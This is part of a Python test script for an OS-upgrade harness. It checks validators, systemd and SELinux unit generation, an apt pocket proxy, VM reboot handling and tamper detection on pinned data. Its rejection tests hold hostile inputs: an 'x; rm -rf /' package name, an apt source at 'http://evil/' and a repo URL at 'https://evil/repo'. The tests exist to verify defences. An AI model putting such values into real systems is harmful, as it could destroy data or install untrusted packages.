                        ("[vm] pockets naming one twice", {**tweb, "vm": {**tweb["vm"], "pockets": ["updates", "updates"]}}, True),
                        ("[vm] pockets as a string", {**tweb, "vm": {**tweb["vm"], "pockets": "updates"}}, True),
                        ("[vm] pockets on a release whose install isn't release_pocket_only",
                         {**web, "vm": {**web["vm"], "pockets": ["updates"]}}, True)):
    errs = check.check_box(box, adapters, "boxes/ubuntu/trusty-web/box.toml")
    print(("refused " if errs else "passed  ") + name if bool(errs) == want else f"WRONG   {name} {errs}")
    bad += bool(errs) != want
# roles run under /bin/sh: dash on Debian and Ubuntu, bash on EL (the dash parse runs only where dash is installed)
import shutil as _sh  # noqa: E402
_dash = bool(_sh.which("dash"))
for name, doc, want in (("an Ubuntu role only bash parses", {**tweb, "roles": {**tweb["roles"], "x": "[[ -n $x ]] && cat <<< y"}},
                         _dash),
                        ("an EL role only bash parses", {**web, "roles": {**web["roles"], "x": "[[ -n $x ]] && cat <<< y"}},
                         False),
                        ("an EL role bash can't parse", {**web, "roles": {**web["roles"], "x": "echo \"${C:-it's}\""}}, True),
                        ("an Ubuntu start_hook only bash parses", {**tweb, "start_hook": "cat <<< y"}, _dash)):
    errs = check.box_shell_errors(doc)
    print(("refused " if errs else "passed  ") + name if bool(errs) == want else f"WRONG   {name} {errs}")
    bad += bool(errs) != want
for name, roles in (("[roles] as a list", ["x"]), ("[roles] as a string", "x"), ("a role that isn't a string", {"x": 1}),
                    ("an empty role", {"x": " "})):
    errs = check.check_box({**tweb, "roles": roles}, adapters, "boxes/ubuntu/trusty-web/box.toml")
    print(("refused " + name) if errs else f"WRONG   {name} passed")
    bad += not errs
# the socket proxy starts from a fresh directory: PID 1 may not unlink a socket the shelter's :Z relabelled
_su = shelter.start_units("billing", _pyplan, "centos7")
_sock = _su.split("/etc/systemd/system/wend-shelter-billing-sock0.socket <<WEND_UNIT\n", 1)[1].split("WEND_UNIT", 1)[0]
_want = ["ExecStartPre=/usr/bin/rm -rf /run/wend/shelter/billing/s0",
         "ExecStartPre=/usr/bin/install -d -m 0700 -o wend-billing -g wend-billing /run/wend/shelter/billing/s0",
         "ListenStream=/run/wend/shelter/billing/s0/mysql.sock"]
_lines = _sock.splitlines()
if all(w in _lines for w in _want) and [_lines.index(w) for w in _want] == sorted(_lines.index(w) for w in _want):
    print("passed  the socket proxy's unit clears and recreates its directory before it listens")
else:
    print(f"WRONG   the socket proxy's unit: {_sock}")
    bad += 1
# the proxies run wend's bin_t copy (unconfined under SELinux), the shelter's containers share one level, and the
# whole start step still parses
_pp = shelter.start_units("billing", {**_pyplan, "ports": ["127.0.0.1:8080"]}, "centos7")
_ok = (f"ExecStart={shelter.PROXYD} /var/lib/mysql/mysql.sock" in _pp.splitlines() and
       f"ExecStart={shelter.PORT_PROXY}-billing 127.0.0.1:8080" in _pp.splitlines() and
       f"cat > {shelter.PORT_PROXY}-billing <<'WEND_SCRIPT'\n#!/bin/sh\n" in _pp and
       "(allow container_t unconfined_service_t (unix_stream_socket (connectto)))" in _pp and
       f"exec {shelter.STOCK_PROXYD} " in _pp and "install -m 0755 /usr/lib/systemd" not in _pp and
       "/bin/sh /etc/wend" not in _pp and
       _pp.count("--security-opt label=level:s0:c$K,c1023") == 1 + len(_pyplan.get("cron", [])) and
       "SELinuxContext=system_u:system_r:unconfined_service_t:s0:c$K,c1023" in _pp.splitlines() and
       "(or (neq t1 container_t) (or (neq t2 unconfined_service_t) (and (eq l1 l2) (eq h1 h2)))))" in _pp)
_r = _sp.run(["bash", "-n"], input=_pp, text=True, capture_output=True)
print(("passed  " if _ok and _r.returncode == 0 else f"WRONG   {_r.stderr[:300]} ") +
      "the proxies start from /usr/libexec/wend's scripts, one SELinux level per shelter, the start step parses")
bad += not (_ok and _r.returncode == 0)
_avc = ['type=AVC msg=audit(1.1:2): avc:  denied  { search } for  pid=9 comm="systemd-socket-" name="1" '
        'scontext=system_u:system_r:systemd_socket_proxyd_t:s0 tcontext=system_u:system_r:init_t:s0 tclass=dir',
        'type=AVC msg=audit(1.1:3): avc:  denied  { read } for  pid=9 comm="sshd" name="x" '
        'scontext=system_u:system_r:sshd_t:s0 tcontext=system_u:object_r:etc_t:s0 tclass=file',
        'type=AVC msg=audit(1.1:4): avc:  denied  { write } for  pid=9 comm="foo" name="foo.sock" '
        'scontext=system_u:system_r:foo_t:s0 tcontext=system_u:object_r:foo_var_run_t:s0 tclass=sock_file']
_d = shelter.vm_denials("billing", "\n".join(_avc))
print(("passed  " if _d == _avc[:1] else f"WRONG   {_d} ") + "the denial list keeps a proxy's denial, not sshd's or another service's socket's")
bad += _d != _avc[:1]
_on = shelter.vm_enforce_on("billing")
_ok = _on.index("semodule -DB") < _on.index("setenforce 1") and "semodule -B" in _on and "semodule -B" in shelter.VM_ENFORCE_OFF
print(("passed  " if _ok else "WRONG   ") + "the enforcing window turns dontaudit off and puts it back")
bad += not _ok
try:
    check.box_shell_errors({**web, "roles": ["x"], "vm": {"live": ["x"]}})
    print("passed  box_shell_errors leaves non-table roles and [vm].live to check_box")
except Exception as e:
    print(f"WRONG   box_shell_errors crashed on non-table roles or [vm].live: {e!r}")
    bad += 1
# the VM installer's pocket proxy: the release pocket always, -updates/-security/-backports only when the box asks ([vm].pockets)
import http.server as _hs  # noqa: E402
import threading as _th  # noqa: E402
import urllib.request as _ur  # noqa: E402
import vm as _vm  # noqa: E402


class _Up(_hs.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *a):
        pass


_up = _hs.ThreadingHTTPServer(("127.0.0.1", 0), _Up)
_th.Thread(target=_up.serve_forever, daemon=True).start()
for allow, path, want in (((), "/ubuntu/dists/trusty/Release", 200), ((), "/ubuntu/dists/trusty-updates/Release", 404),
                          ((), "/ubuntu/dists/trusty-security/Release", 404),
                          (("updates", "security"), "/ubuntu/dists/trusty-updates/Release", 200),
                          (("updates", "security"), "/ubuntu/dists/trusty-security/Release", 200),
                          (("updates", "security"), "/ubuntu/dists/trusty-backports/Release", 404),
                          (("updates", "security", "backports"), "/ubuntu/dists/trusty-backports/Release", 200),
                          (("updates", "security", "backports"), "/ubuntu/dists/trusty-proposed/Release", 404),
                          (("updates",), "/ubuntu/dists/trusty-security/Release", 404)):
    px = _vm.PocketProxy(f"http://127.0.0.1:{_up.server_address[1]}", allow)
    try:
        got = _ur.urlopen(f"http://127.0.0.1:{px.port}{path}", timeout=10).status
    except _ur.HTTPError as e:
        got = e.code
    finally:
        px.httpd.shutdown()
        px.httpd.server_close()
    name = f"the VM pocket proxy allowing {list(allow)} answers {want} for {path}"
    print(("passed  " if got == want else f"WRONG   got {got}: ") + name)
    bad += got != want
_up.shutdown()
# the kernel handover's place in a hop (SPEC "Kernels and the bootloader"): right after refresh, and right after the
# upgrade; Debian has only the second. Parity holds the client to the same order.
import walk as _walk  # noqa: E402
for fam, hop in (("el", "centos6"), ("debian", "squeeze")):
    w_ = type("W", (), {})()
    w_.adapter = adapters[fam]
    pre = [{**el_good, "hop": hop, "pre": [{"op": "kv.set", "path": "/etc/vsftpd/vsftpd.conf", "values": {"listen": "YES"}}],
            "post": []}] if fam == "el" else []
    first, second = _walk.Walk.hop_parts(w_, hop, pre)
    h_ = adapters[fam]["hop"]
    kb = [_walk.fill(c, w_.vars) for c in h_.get("kernel_before", [])]
    ka = [_walk.fill(c, w_.vars) for c in h_.get("kernel_after", [])]
    rel = adapters[fam]["releases"].get(hop)
    up = [_walk.fill(c, w_.vars) for c in (rel["upgrade"] if isinstance(rel, dict) and "upgrade" in rel
                                            else h_["upgrade"])]
    if fam == "el":  # kernel_before before the pre steps: rpm.transit (a pre step) needs the kernel records gone
        ok = bool(kb) and bool(ka) and first[2:2 + len(kb)] == kb and "vsftpd" in first[2 + len(kb)] and \
            first[-len(ka):] == ka and first[-len(ka) - len(up):-len(ka)] == up
    else:  # Debian's packages carry its kernels; the harness only keeps GRUB 2 installed, after the transaction
        ok = not kb and bool(ka) and first[-len(ka):] == ka and first[-len(ka) - len(up):-len(ka)] == up
    print(("passed  " if ok else "WRONG   ") + f"{fam} {hop}: kernel steps right after refresh and right after the upgrade")
    bad += not ok
# Ubuntu: the adapter's own harness steps can't be reached or widened by a fix. A fix can't write the sources a hop
# sets aside or the policy-rc.d the xenial MySQL stand-in swaps; xenial and jammy take their own upgrade, every other
# Ubuntu hop the family's.
ub_good = {**copy.deepcopy(good), "family": "ubuntu", "hop": "xenial", "when": {"installed": "mysql-server-5.5"},
           "post": [{"op": "install", "packages": ["mysql-server-5.7"]}]}
ub_rel = "fixes/ubuntu/xenial/reinstall-mysql-server-5.1-after-hop.toml"
assert check.check_fix(ub_good, adapters, ub_rel) == [], check.check_fix(ub_good, adapters, ub_rel)
for name, step in (("ubuntu: write a PPA into sources.list.d", {"op": "write-file",
                    "path": "/etc/apt/sources.list.d/evil.list", "content": "deb http://evil/ x main\n"}),
                   ("ubuntu: replace the policy-rc.d the xenial stand-in swaps", {"op": "write-file",
                    "path": "/usr/sbin/policy-rc.d", "content": "exit 0\n"}),
                   ("ubuntu: write the stand-in's saved policy-rc.d", {"op": "write-file",
                    "path": "/tmp/wend-policy-rc.d", "content": "exit 0\n"})):
    f = copy.deepcopy(ub_good)
    f["post"].append(step)
    errs = check.check_fix(f, adapters, ub_rel)
    print(("refused " if errs else "MISSED  ") + name + (f"  ({errs[0].split(': ', 1)[1]})" if errs else ""))
    bad += not errs
for hop in adapters["ubuntu"]["ladder"][1:]:
    w_ = type("W", (), {})()
    w_.adapter = adapters["ubuntu"]
    first, _ = _walk.Walk.hop_parts(w_, hop, [])
    rel = adapters["ubuntu"]["releases"].get(hop)
    up = rel["upgrade"] if hop in ("xenial", "jammy") else adapters["ubuntu"]["hop"]["upgrade"]
    kb = [_walk.fill(c, w_.vars) for c in adapters["ubuntu"]["hop"]["kernel_before"]]
    ok = first[-len(up):] == up and (("policy-rc.d" in "".join(first)) == (hop == "xenial")) and \
        (("usrmerge" in "".join(first)) == (hop == "jammy")) and first[2:2 + len(kb)] == kb
    print(("passed  " if ok else "WRONG   ") + f"ubuntu {hop}: old kernels purged after refresh, the hop's own upgrade, only xenial's and jammy's "
          "extras")
    bad += not ok
class _Clock:  # vm.reboot()'s clock: sleeping only moves it on
    def __init__(self):
        self.now = 1e6

    def time(self):
        return self.now

    def sleep(self, s):
        self.now += s


class _RebootGuest(_vm.Guest):  # a guest whose ssh is a script: `fails` boot_id reads fail, then reads work
    def __init__(self, clock, fails, reboots, resets=True, silent=0):
        self.clock, self.fails, self.reboots, self.resets, self.reset_sent = clock, fails, reboots, resets, False
        self.silent, self.silent_until = silent, None  # after the reboot is sent, ssh says nothing for `silent` s
        self.boot, self.up_since, self.reboot_notes = "old-boot", clock.now - 5000, []

    def new_boot(self, after=0):
        self.boot, self.up_since = "new-boot", self.clock.now + after

    def ssh(self, cmd, timeout=600, stdin=None):
        if self.silent_until is not None and self.clock.now < self.silent_until:
            self.clock.now += timeout  # an ssh that never connects costs its whole timeout
            return 255, "TIMEOUT"
        if cmd == "cat /proc/sys/kernel/random/boot_id":
            if self.fails:
                self.fails -= 1
                return 255, "kex_exchange_identification: read: Connection reset by peer\n"
            return 0, self.boot + "\n"
        if cmd == "cat /proc/uptime":
            return 0, f"{self.clock.now - self.up_since:.2f} 1.00\n"
        if cmd.startswith("sync; (sleep 2; reboot)"):
            if self.silent:
                self.silent_until = self.clock.now + self.silent
            if self.reboots:
                self.new_boot(after=3)
        if cmd.startswith("setsid nohup sh /root/.wend-reset"):
            self.reset_sent = True
            if self.resets:
                self.new_boot()
        return 0, ""

    def running(self):
        return True

    def wait_ssh(self, timeout=900):
        t = self.clock.now
        while self.clock.now - t < timeout:
            if self.ssh("true", timeout=30)[0] == 0:
                return True
            self.clock.sleep(5)
        return False


_real_time = _vm.time
for name, fails, reboots, resets, silent, want_back, want_forced, want_notes in (
        ("one failed boot_id read is retried, the reboot proven by boot_id", 2, True, True, 0, True, False, 2),
        ("boot_id unreadable before the reboot: rebooted anyway, proven by uptime", 5, True, True, 0, True, False, 6),
        ("boot_id unreadable and `reboot` does nothing: the forced path runs", 5, False, True, 0, True, True, 6),
        ("boot_id unreadable and even the forced reset does nothing: not rebooted", 5, False, False, 0, False, True, 6),
        ("boot_id read and `reboot` does nothing: the forced path runs", 0, False, True, 0, True, True, 0),
        ("a real reboot with a silent poll on the way leaves no notes", 0, True, True, 15, True, False, 0),
        ("`reboot` does nothing and ssh is silent all window, then the old boot answers: forced", 0, False, True, 200,
         True, True, None)):
    _vm.time = _Clock()
    try:
        g_ = _RebootGuest(_vm.time, fails, reboots, resets, silent)
        back, forced = g_.reboot()
    finally:
        _vm.time = _real_time
    ok = back is want_back and forced == want_forced and g_.reset_sent == want_forced and \
        (len(g_.reboot_notes) == want_notes if want_notes is not None else
         any(n.startswith("no answer") for n in g_.reboot_notes) and "old boot" in g_.reboot_notes[-1]) and \
        all("rc=255" in n and "Connection reset" in n for n in g_.reboot_notes[:min(fails, 5)])
    print(("passed  " if ok else "WRONG   ") + f"vm reboot: {name}  ({back}, {forced}, {g_.reboot_notes[-1:]})")
    bad += not ok


# the VM tier's network comparison drops the shelter's own bridge, as podman reports it, and nothing else


class _G:
    def __init__(self, net, inspect):
        self.net, self.inspect = net, inspect

    def ssh(self, cmd, **kw):
        return (0, self.inspect) if cmd.startswith("podman network inspect wend-billing ") else (0, self.net)


_start = "eth0 10.0.2.20/24\ndefault via 10.0.2.2\nnameserver 10.0.2.3\n"
_with = "eth0 10.0.2.20/24\npodman1 10.90.0.1/24\ndefault via 10.0.2.2\nnameserver 10.0.2.3\n"
_stray = "eth0 10.0.2.20/24\npodman1 10.90.0.1/24\npodman2 10.89.0.1/24\ndefault via 10.0.2.2\nnameserver 10.0.2.3\n"
_ok = (_vm.net_read(_G(_with, "podman1 10.90.0.1 \n"), {"billing": {}}) == _start and
       _vm.net_read(_G(_stray, "podman1 10.90.0.1 \n"), {"billing": {}}) != _start and
       _vm.net_read(_G(_with, ""), {"billing": {}}) != _start and _vm.net_read(_G(_with, "podman1 10.90.0.1"), {}) != _start)
print(("passed  " if _ok else "WRONG   ") + "the network comparison drops the shelter's own bridge and nothing else")
bad += not _ok

# the leapp-data extract (SPEC "Package evolution data"): the pinned bytes, parsed strictly, or check refuses it
import hashlib as _hl  # noqa: E402
import json as _js  # noqa: E402
import shutil as _sh  # noqa: E402
import tempfile as _tf  # noqa: E402

_t = _tf.mkdtemp()
_sh.copytree(os.path.join(check.ROOT, "adapters", "leapp"), os.path.join(_t, "adapters", "leapp"))
_d = os.path.join(_t, "adapters", "leapp", "el")
_man, _ext = open(os.path.join(_d, "manifest.toml")).read(), open(os.path.join(_d, "almalinux.jsonl")).read()
_ok = check.pes_errors(_t) == []
print(("passed  " if _ok else f"WRONG   {check.pes_errors(_t)[:2]} ") + "the committed leapp-data extract is the pinned one")
bad += not _ok


def _pes_case(name, man=None, ext=None, extra=None, repin=True):
    """Write a tampered manifest or extract (repinned to its new sha256 unless repin is False), check, restore."""
    global bad
    if ext is not None:
        open(os.path.join(_d, "almalinux.jsonl"), "w").write(ext)
        if repin:
            old = "sha256:" + _hl.sha256(_ext.encode()).hexdigest()
            man = (man or _man).replace(old, "sha256:" + _hl.sha256(ext.encode()).hexdigest())
    if man is not None:
        open(os.path.join(_d, "manifest.toml"), "w").write(man)
    if extra:
        open(os.path.join(_d, "extra.jsonl"), "w").write(_ext)
    errs = check.pes_errors(_t)
    print(("refused " if errs else "MISSED  ") + name + (f"  ({errs[0][:110]})" if errs else ""))
    bad += not errs
    open(os.path.join(_d, "manifest.toml"), "w").write(_man)
    open(os.path.join(_d, "almalinux.jsonl"), "w").write(_ext)
    if extra:
        os.unlink(os.path.join(_d, "extra.jsonl"))


_lines = _ext.splitlines(keepends=True)
_ev = _js.loads(_lines[1])


def _with(**kw):
    return "".join([_lines[0], _js.dumps(_ev | kw, sort_keys=True, separators=(",", ":")) + "\n", *_lines[2:]])


_pes_case("a leapp-data extract edited to hide a gap, not repinned", ext=_ext.replace(_lines[1], ""), repin=False)
_pes_case("a leapp-data pin moved to a branch name", man=_man.replace(_js.loads(_lines[0])["commit"], "main"))
_pes_case("a leapp-data extract whose header names another commit than the manifest",
          man=_man.replace(_js.loads(_lines[0])["commit"], "f" * 40))
_pes_case("a shell command as a leapp-data package name, repinned",
          ext=_with(**{"in": [{"name": "x; rm -rf /", "repo": "base"}]}))
_pes_case("a URL as a leapp-data repo, repinned", ext=_with(out=[{"name": "x", "repo": "https://evil/repo"}]))
_pes_case("an unknown key in a leapp-data event, repinned", ext=_with(run="sh"))
_pes_case("an unknown leapp-data action, repinned", ext=_with(action="install"))
_pes_case("a leapp-data package set past its size cap, repinned",
          ext=_with(out=[{"name": f"p{i}", "repo": "base"} for i in range(300)]))
_pes_case("a leapp-data extract in the directory but not pinned", extra=True)
_pes_case("a leapp-data source dropped from the manifest and the directory",
          man=_man[:_man.index("[files.epel]")], ext=None)
_sh.rmtree(_t)
sys.exit(1 if bad else 0)
